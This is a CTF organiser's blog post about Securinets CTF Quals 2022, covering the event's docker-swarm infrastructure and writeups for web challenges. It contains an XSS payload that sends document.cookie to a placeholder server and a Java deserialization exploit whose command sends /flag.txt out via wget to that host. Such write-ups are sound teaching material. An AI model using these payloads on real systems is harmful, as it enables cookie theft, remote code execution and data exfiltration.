@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academic 4.8.0">
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Belkahla Ahmed">
+
+  
+  
+  
+    
+  
+  <meta name="description" content="The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement.">
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://ahmed-belkahla.me/post/securinetsquals/">
+
+  
+
+
+  
+  
+  
+  <meta name="theme-color" content="rgb(0, 136, 204)">
+  
+
+  
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.min.css" integrity="sha256-4w9DunooKSr3MFXHXWyFER38WmPdm361bQS/2KUWZbU=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/github.min.css" crossorigin="anonymous" title="hl-light" disabled>
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark">
+        
+      
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.css" integrity="sha256-SHMGCYmST46SoyGgo4YR/9AlK1vf3ff84Aq9yK4hdqM=" crossorigin="anonymous">
+    
+
+    
+
+    
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js" integrity="sha256-Md1qLToewPeKjfAHU1zyPwOutccPAm5tahnaw7Osw0A=" crossorigin="anonymous" async></script>
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+      
+
+      
+      
+        
+      
+
+      
+    
+      
+
+      
+      
+
+      
+    
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,700%7CRoboto:400,400italic,700%7CRoboto+Mono&display=swap">
+  
+
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/academic.css">
+
+  
+
+
+
+
+  
+
+
+  
+
+  <link rel="manifest" href="/index.webmanifest">
+  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png">
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png">
+
+  <link rel="canonical" href="https://ahmed-belkahla.me/post/securinetsquals/">
+
+  
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image">
+  
+  <meta property="twitter:site" content="@BelkahlaAhmed1">
+  <meta property="twitter:creator" content="@BelkahlaAhmed1">
+  
+  <meta property="og:site_name" content="Ahmed Belkahla">
+  <meta property="og:url" content="https://ahmed-belkahla.me/post/securinetsquals/">
+  <meta property="og:title" content="Securinets CTF Quals 2022 - Infrastructure and Web writeups | Ahmed Belkahla">
+  <meta property="og:description" content="The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement."><meta property="og:image" content="https://ahmed-belkahla.me/img/me.jpg">
+  <meta property="twitter:image" content="https://ahmed-belkahla.me/img/me.jpg"><meta property="og:locale" content="en-us">
+  
+    
+      <meta property="article:published_time" content="2022-04-14T00:00:00&#43;00:00">
+    
+    <meta property="article:modified_time" content="2022-04-14T00:00:00&#43;00:00">
+  
+
+  
+
+
+    
+
+
+
+
+
+
+  
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://ahmed-belkahla.me/post/securinetsquals/"
+  },
+  "headline": "Securinets CTF Quals 2022 - Infrastructure and Web writeups",
+  
+  "datePublished": "2022-04-14T00:00:00Z",
+  "dateModified": "2022-04-14T00:00:00Z",
+  
+  "author": {
+    "@type": "Person",
+    "name": "Belkahla Ahmed"
+  },
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Ahmed Belkahla",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://ahmed-belkahla.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"
+    }
+  },
+  "description": "The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement."
+}
+</script>
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+
+  <title>Securinets CTF Quals 2022 - Infrastructure and Web writeups | Ahmed Belkahla</title>
+
+</head>
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="dark">
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search">
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">Ahmed Belkahla</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">Ahmed Belkahla</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Posts</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#projects"><span>Projects</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/files/cv.pdf"><span>CV</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      <li class="nav-item dropdown theme-dropdown">
+        <a href="#" class="nav-link js-theme-selector" data-toggle="dropdown" aria-haspopup="true">
+          <i class="fas fa-palette" aria-hidden="true"></i>
+        </a>
+        <div class="dropdown-menu">
+          <a href="#" class="dropdown-item js-set-theme-light">
+            <span>Light</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-dark">
+            <span>Dark</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-auto">
+            <span>Automatic</span>
+          </a>
+        </div>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+<div class="article-container pt-3">
+  <h1>Securinets CTF Quals 2022 - Infrastructure and Web writeups</h1>
+
+  
+
+  
+    
+
+
+<div class="article-metadata">
+
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Apr 14, 2022
+  </span>
+  
+
+  
+
+  
+  <span class="middot-divider"></span>
+  <span class="article-reading-time">
+    6 min read
+  </span>
+  
+
+  
+  
+  
+
+  
+  
+
+</div>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <p>The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement.</p>
+<p><img src="https://i.imgur.com/NYhqlD8.png" alt="CTFTIME"></p>
+<p>As Securinets Technical director I was in charge of managing the CTF, I took care of the Infrastructure and wrote 3 web challenges. In this article we will talk about some infrastructure details and the solutions of my web challenges.
+1-Infrastructure
+2-Planet sheet Writeup (XSS with CSP Bypass)
+3-BrokenParrot Writeup (Custom Java Deserialization Gadget)
+4-NarutoKeeper Writeup (XSLeak Challenge)</p>
+<h2 id="infrastructure">Infrastructure</h2>
+<p>We knew that a huge number will participate so we tried to anticipate in order to have a stable infrastructure. We opted for the following architecture:</p>
+<p>A separated instance for the Database and an instance for the platform. I used docker swarm ( 4 containers ) and Traefik as a load balancer to ensure a certain level of scalability. This was the final docker-compose:</p>
+<pre><code class="language-yaml">version: '3.8'
+
+services:
+  ctfd:
+    image: 127.0.0.1:2000/qualsplat
+    build: .
+    user: root
+    restart: always
+    ports:
+      - &quot;8000:8000&quot;
+    environment:
+      - DATABASE_URL=mysql+pymysql://ctfd:REDACTED@IP/ctfd
+      - SECRET_KEY=REDACTED
+      - REDIS_URL=redis://cache:6379
+      - WORKERS=6
+      - LOG_FOLDER=/var/log/CTFd
+      - SQLALCHEMY_MAX_OVERFLOW=800
+      - SQLALCHEMY_POOL_PRE_PING=True
+      - ACCESS_LOG=-
+      - ERROR_LOG=-
+      - REVERSE_PROXY=true
+ #   volumes:
+ #     - /logs:/var/log/CTFd
+ #     - /opt/CTFd:/opt/CTFd:ro
+    deploy:
+      replicas: 4
+      placement:
+        max_replicas_per_node: 4
+      labels:
+        - &quot;traefik.enable=true&quot;
+        - &quot;traefik.http.routers.ctfd.rule=Host(`20.231.33.243`) || Host(`www.ctfsecurinets.tech`) || Host(`ctfsecurinets.tech`)&quot;
+        - &quot;traefik.http.routers.ctfd.entrypoints=web&quot;
+        - &quot;traefik.http.services.ctfd.loadbalancer.server.port=8000&quot;
+        - &quot;traefik.http.services.ctfd.loadbalancer.sticky=true&quot;
+        - &quot;traefik.http.services.ctfd.loadbalancer.sticky.cookie.name=StickyCookie&quot;
+    networks:
+        net:
+        internal:
+
+
+  loadbalancer:
+    image: traefik:v2.2
+    command: 
+      - &quot;--log.level=ERROR&quot;
+      - &quot;--api.insecure=true&quot;
+      - &quot;--providers.docker.swarmMode=true&quot;
+      - &quot;--providers.docker.network=quals_net&quot;
+      - &quot;--providers.docker.exposedbydefault=false&quot;
+      - &quot;--entrypoints.web.address=:80&quot;
+    ports:
+      - 80:80
+      - 9000:8080
+      - 5000:5000
+    network_mode: &quot;host&quot;
+    deploy:
+      restart_policy:
+        condition: any
+      mode: replicated
+      placement:
+        constraints:
+          - &quot;node.role==manager&quot;
+         max_replicas_per_node: 1
+      replicas: 1
+      update_config:
+        delay: 2s
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+    networks:
+        net:
+
+networks:
+    default:
+    internal:
+        internal: true
+    net:
+
+</code></pre>
+<h3 id="monitoring">Monitoring</h3>
+<p>For monitoring and alerting I inspired from @theoremoon san in Zer0ptsCTF and used 
+<a href="https://mackerel.io" target="_blank" rel="noopener">Mackerel</a> .</p>
+<p><img src="https://i.imgur.com/BHHTuwV.png" alt="DASHBOARD"></p>
+<p>It is easy to setup and supports alerting via different channels ( including Discord ) so I installed the agent in the most critical servers of the infra which helped us a lot in handling and anticipating the different issues.</p>
+<p><img src="https://i.imgur.com/82gqHiE.png" alt="MONITOR"></p>
+<p>In case of any alerts we receive a similar message in discord:</p>
+<p><img src="https://i.imgur.com/hiKJuMO.png" alt="ALERT"></p>
+<h1 id="web-challenges-writeup">Web Challenges Writeup:</h1>
+<h2 id="planet-sheet">Planet sheet:</h2>
+<p>I thought that this challenge will be a good warm up but some players ended up having some troubles with it. Visiting the website we can notice /show.php page that has a src parameter getting reflected directly in the page:</p>
+<p><img src="https://i.imgur.com/7zGxIBp.png" alt="REFLECTED"></p>
+<p>We can notice that the Content-Type is <strong>text/xsl</strong> so usual script tags won&rsquo;t work here since it&rsquo;s not rendered as an HTML Page.</p>
+<p><img src="https://i.imgur.com/ikGS9Pk.png" alt="CT">
+So we will use the following payload to execute JS code.</p>
+<pre><code>&lt;x:script xmlns:x=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(document.domain)&lt;/x:script&gt;
+
+</code></pre>
+<p>A keen eye may have already noticed the CSP. For the first time it may appear as a strict policy protected by nonces but if we refresh the page for a few times, we can see that the nonce is fixed thus we can reuse it here.</p>
+<pre><code>&lt;x:script nonce=&quot;Y8Ret8N5CPXrSG&quot; xmlns:x=&quot;http://www.w3.org/1999/xhtml&quot;&gt;fetch(&quot;http://Your_Server?a=&quot;+document.cookie)&lt;/x:script&gt;
+
+</code></pre>
+<h2 id="brokenparr0t">BrokenParr0t</h2>
+<p><img src="https://i.imgur.com/UFecnMQ.png" alt="CARD"></p>
+<p>I was lately interested in Java Deserialization custom gadget chains and done a lot of researchs on this subject, my first attempt was in FwordCTF 2021 where I created Parrot challenge (
+<a href="https://exti0p.github.io/ctf/2021/FwordCTF/web/parrotox.html" target="_blank" rel="noopener">Writeup</a> If you are interested) and in Securinets Quals I decided to try another idea with some new gadget types.
+As always, we have given the source code to the participants. After decompiling the jar file with jd-gui, we can explore the different classes of the application. At first glance, we can notice the arbitrary java deserialization in the /latest_question endpoint but we can notice that the input is handled first by a class Security.</p>
+<p><img src="https://i.imgur.com/HlkSnEl.png" alt="SOURCE"></p>
+<p>Digging in Security class we see that it&rsquo;s restricting the deserialization of only the classes in com.securinets.utils  and java.(.*) packages.</p>
+<p><img src="https://i.imgur.com/Rab6YyP.png" alt="SECURITY"></p>
+<p>It&rsquo;s pretty obvious that we manually need to craft the gadget chain to achieve RCE since automated tools won&rsquo;t work here. We can see that com.securinets.utils.QuestionCompar is overriding compare method and deserializing the value of <strong>internal</strong> attribute after Base64 decoding it. The deserialized object here is also restricted by another class called LooseSecurity which let us deserialize classes from com.securinets package, so the scope to search for gadgets is bigger.</p>
+<p><img src="https://i.imgur.com/Zzk0BHQ.png" alt="JAVA"></p>
+<p>The idea here is to PriorityQueue class in java.util with the custom comparator QuestionCompar as an entry gadget. If we dig in PriorityQueue source code in jdk, we see that when it&rsquo;s deserialized it calls the method heapify 
+<a href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l779" target="_blank" rel="noopener">L779</a>, heapify method will also call siftdown 
+<a href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l734" target="_blank" rel="noopener">L734</a> that will call siftdown 
+<a href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l685" target="_blank" rel="noopener">L695</a>. finally since we have provided a custom comparator, siftDownUsingComparator method will call the overriden compare method in QuestionCompa comparator 
+<a href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l712" target="_blank" rel="noopener">L712</a>.
+Now for the last piece, we can take a look at the serializable class com.securinets.services.Author that is calling compute method as follow:</p>
+<p><img src="https://i.imgur.com/Fr9jBpn.png" alt="AUTHOR"></p>
+<p>We need to set uuid attribute to a value that has a hashcode equal to 0 (f5a5a608), and name attribute to our final payload that reads the flag.</p>
+<pre><code class="language-java">import com.securinets.services.Author;
+import com.securinets.utils.QuestionCompar;
+
+import java.io.ByteArrayOutputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+public class Exp {
+    public Exp() {
+    }
+
+    public static void main(String[] var0) {
+        try {
+//second object
+            Author auth = new Author();
+            Field uuid = Author.class.getDeclaredField(&quot;uuid&quot;);
+            uuid.setAccessible(true);
+            uuid.set(auth, new String(&quot;f5a5a608&quot;));
+            Field name = Author.class.getDeclaredField(&quot;name&quot;);
+            name.setAccessible(true);
+            name.set(auth, new String(&quot;sh -c $@|sh . echo wget http://Your_Server?a=$(cat /flag.txt|base64|tr -d \&quot;\n\&quot;)&quot;));
+            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            final ObjectOutputStream objectOutputStream;
+            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+            objectOutputStream.writeObject(auth);
+            objectOutputStream.close();
+            String secondSerial = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+
+            Constructor ctor =  QuestionCompar.class.getDeclaredConstructor();
+            ctor.setAccessible(true);
+            Comparator comparator=(Comparator) ctor.newInstance();
+            Field var1 = QuestionCompar.class.getDeclaredField(&quot;internal&quot;);
+            var1.setAccessible(true);
+            var1.set(comparator, secondSerial);
+            final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+            queue.add(new String(&quot;1&quot;));
+            queue.add(new String(&quot;1&quot;));
+
+
+            FileOutputStream fileOutputStream
+                    = new FileOutputStream(&quot;result&quot;);
+            ObjectOutputStream oos
+                    = new ObjectOutputStream(fileOutputStream);
+            oos.writeObject(queue);
+            oos.flush();
+            oos.close();
+
+            System.out.println(&quot;Object has been serialized&quot;);
+        } catch (Exception var6) {
+            System.out.println(&quot;IOException is caught&quot;);
+	    var6.printStackTrace();
+        }
+    }
+}
+
+
+</code></pre>
+<p>In a nutshell, this exploit starts by creating a ProprityQueue object implementing QuestionCompar as a custom comparator after setting the internal attribute to the value of Author class serialized and Base64 encoded.</p>
+<h2 id="narutokeeper">NarutoKeeper</h2>
+<p>XSLeak vulnerability attracted me a lot lately so as a ritual I&rsquo;m publishing a different challenge about this vulnerability in every CTF. This particular challenge was meant to be harder, but due to a little mistake it was solved with another technique, so I decided to keep the intended solution for a future CTF since it&rsquo;s worth the effort.
+<img src="https://i.imgur.com/is1Wwwa.png" alt="TASK">
+As every XSLeak challenge we need to leak the flag from a cross origin context. Here in the search endpoint we can notice that is the answer is correct we will be redirected to /view endpoint otherwise we will receive a no results message. So if we detect if the redirect has happened or not in cross origin, we will manage to exfiltrate the flag char by char.</p>
+<p><img src="https://i.imgur.com/gx6QDgF.png" alt="SEARCH"></p>
+<p>In fact, fetch throws an error if we exceed 20 redirects, so the idea is to redirect the admin to our controlled website 19 times and in the 20th redirect we initiate our search request, thus if the char is correct we will be redirected to /view so we will have a network error since we exceeded the possible 20 redirect otherwise network error won&rsquo;t be triggered.
+You can check the following <strong>
+<a href="https://ctf.zeyu2001.com/2022/securinets-ctf-quals-2022/narutokeeper" target="_blank" rel="noopener">Writeup</a></strong> and exploit by zeyu2001 for example.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>We hope that everyone enjoyed this edition of Securinets Quals, we were very happy to reach 70 weight in CTFTime so we are now the most rated CTF in MENA Region. We can&rsquo;t wait to see everyone in the finals so soon!</p>
+
+    </div>
+
+    
+
+
+
+
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://ahmed-belkahla.me/post/securinetsquals/&amp;text=Securinets%20CTF%20Quals%202022%20-%20Infrastructure%20and%20Web%20writeups" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://ahmed-belkahla.me/post/securinetsquals/&amp;t=Securinets%20CTF%20Quals%202022%20-%20Infrastructure%20and%20Web%20writeups" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=Securinets%20CTF%20Quals%202022%20-%20Infrastructure%20and%20Web%20writeups&amp;body=https://ahmed-belkahla.me/post/securinetsquals/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://ahmed-belkahla.me/post/securinetsquals/&amp;title=Securinets%20CTF%20Quals%202022%20-%20Infrastructure%20and%20Web%20writeups" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://web.whatsapp.com/send?text=Securinets%20CTF%20Quals%202022%20-%20Infrastructure%20and%20Web%20writeups%20https://ahmed-belkahla.me/post/securinetsquals/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://ahmed-belkahla.me/post/securinetsquals/&amp;title=Securinets%20CTF%20Quals%202022%20-%20Infrastructure%20and%20Web%20writeups" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <img class="avatar mr-3 avatar-circle" src="/authors/kahla/avatar_huac9af2fd1f181695ca5d7a1e646fb7d2_9022537_270x270_fill_lanczos_center_3.png" alt="Belkahla Ahmed">
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://ahmed-belkahla.me/">Belkahla Ahmed</a></h5>
+      <h6 class="card-subtitle">Cyber Security Specialist @ Yogosha - CTF Player @ Zer0pts</h6>
+      <p class="card-text">Cyber Security Enthusiast from Tunisia, I enjoy playing in hacking and pentesting competitions,I skip classes to play CTF.</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/BelkahlaAhmed1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/kahla-sec" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/files/cv.pdf" >
+        <i class="ai ai-cv"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  </div>
+</article>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js" integrity="sha256-eOgo0OtLL4cdq7RdwRUiGKLX9XsIJ7nGhWEKbohmVAQ=" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
+    
+
+    
+    
+    <script>const code_highlighting = true;</script>
+    
+
+    
+    
+    <script>const isSiteThemeDark = true;</script>
+    
+
+    
+    
+    
+    
+    
+    
+    <script>
+      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
+      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
+      const content_type = {
+        'post': "Posts",
+        'project': "Projects",
+        'publication' : "Publications",
+        'talk' : "Talks"
+        };
+    </script>
+    
+
+    
+    
+
+    
+    
+    <script id="search-hit-fuse-template" type="text/x-template">
+      <div class="search-hit" id="summary-{{key}}">
+      <div class="search-hit-content">
+        <div class="search-hit-name">
+          <a href="{{relpermalink}}">{{title}}</a>
+          <div class="article-metadata search-hit-type">{{type}}</div>
+          <p class="search-hit-description">{{snippet}}</p>
+        </div>
+      </div>
+      </div>
+    </script>
+    
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      
+    
+    
+    
+    
+    <script src="/js/academic.min.1f97b17be6d67ca715feaf9deb10e550.js"></script>
+
+    
+
+
+
+
+
+
+  
+  
+  <div class="container">
+    <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    © Ahmed Belkahla, 2022 &middot; 
+
+    Powered by the
+    <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
+    <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a>.
+
+    
+    <span class="float-right" aria-hidden="true">
+      <a href="#" class="back-to-top">
+        <span class="button_icon">
+          <i class="fas fa-chevron-up fa-2x"></i>
+        </span>
+      </a>
+    </span>
+    
+  </p>
+</footer>
+
+  </div>
+  
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
